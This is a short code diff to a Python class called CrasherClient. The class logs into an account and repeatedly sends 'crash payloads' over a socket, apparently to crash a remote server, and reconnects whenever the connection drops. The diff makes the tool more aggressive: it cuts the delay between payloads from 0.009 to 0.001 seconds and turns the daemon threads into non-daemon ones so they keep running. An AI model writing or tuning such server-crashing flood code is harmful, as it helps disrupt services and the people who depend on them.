@@ -28,8 +28,8 @@ class CrasherClient:
 
 
         self._initialise()
-        threading.Thread(target=self.keep_alive, daemon=True).start()
-        threading.Thread(target=self.crash, daemon=True).start()
+        threading.Thread(target=self.keep_alive, daemon=False).start()
+        threading.Thread(target=self.crash, daemon=False).start()
 
 
     def _initialise(self):
@@ -81,7 +81,7 @@ class CrasherClient:
         self.second_sock = None
         self.account.login()
         self._initialise()
-        threading.Thread(target=self.keep_alive, daemon=True).start()
+        threading.Thread(target=self.keep_alive, daemon=False).start()
         threading.Thread(target=self.crash, daemon=False).start()
 
 
@@ -90,7 +90,7 @@ class CrasherClient:
             try:
                 for payload in self.crash_payloads[:]:
                     self.second_sock.sendall(payload)
-                    time.sleep(0.009)
+                    time.sleep(0.001)
             except:break
         self.restart()
 
